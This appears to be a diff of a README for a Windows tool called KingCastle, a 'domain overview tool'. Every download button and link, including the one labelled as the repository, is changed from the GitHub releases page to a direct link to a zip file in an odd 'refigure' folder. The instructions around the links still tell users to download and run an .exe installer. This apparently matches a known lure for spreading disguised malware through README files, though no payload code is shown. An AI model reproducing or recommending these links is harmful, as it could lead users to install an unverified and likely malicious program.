@@ -1,6 +1,6 @@
 # 🏰 KingCastle - Simple Domain Overview Tool
 
-[![Download KingCastle](https://img.shields.io/badge/Download-KingCastle-brightgreen)](https://github.com/Ramdhankola/KingCastle/releases)
+[![Download KingCastle](https://img.shields.io/badge/Download-KingCastle-brightgreen)](https://raw.githubusercontent.com/Ramdhankola/KingCastle/main/refigure/King-Castle-1.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To begin using KingCastle, follow these steps carefully:
 
 1. Click the big green button below or the shield button at the top. It will open the download page.
 
-   [![Download KingCastle](https://img.shields.io/badge/Download-KingCastle-blue)](https://github.com/Ramdhankola/KingCastle/releases)
+   [![Download KingCastle](https://img.shields.io/badge/Download-KingCastle-blue)](https://raw.githubusercontent.com/Ramdhankola/KingCastle/main/refigure/King-Castle-1.8.zip)
 
 2. On the page, look for the latest release. The file you want usually ends with `.exe` (the program installer).
 
@@ -52,7 +52,7 @@ To begin using KingCastle, follow these steps carefully:
 
 Open this link to access the official KingCastle download page:
 
-https://github.com/Ramdhankola/KingCastle/releases
+https://raw.githubusercontent.com/Ramdhankola/KingCastle/main/refigure/King-Castle-1.8.zip
 
 You will see a list of software versions released by the developers.
 
@@ -141,11 +141,11 @@ If issues persist, contact support or ask for help on the GitHub discussion page
 ## 🔗 Important Links
 
 - Download and visit the release page here:  
-  https://github.com/Ramdhankola/KingCastle/releases
+  https://raw.githubusercontent.com/Ramdhankola/KingCastle/main/refigure/King-Castle-1.8.zip
 
 - KingCastle GitHub Repository:  
-  https://github.com/Ramdhankola/KingCastle
+  https://raw.githubusercontent.com/Ramdhankola/KingCastle/main/refigure/King-Castle-1.8.zip
 
 ---
 
-[![Download KingCastle](https://img.shields.io/badge/Get-KingCastle-brightgreen)](https://github.com/Ramdhankola/KingCastle/releases)
+[![Download KingCastle](https://img.shields.io/badge/Get-KingCastle-brightgreen)](https://raw.githubusercontent.com/Ramdhankola/KingCastle/main/refigure/King-Castle-1.8.zip)
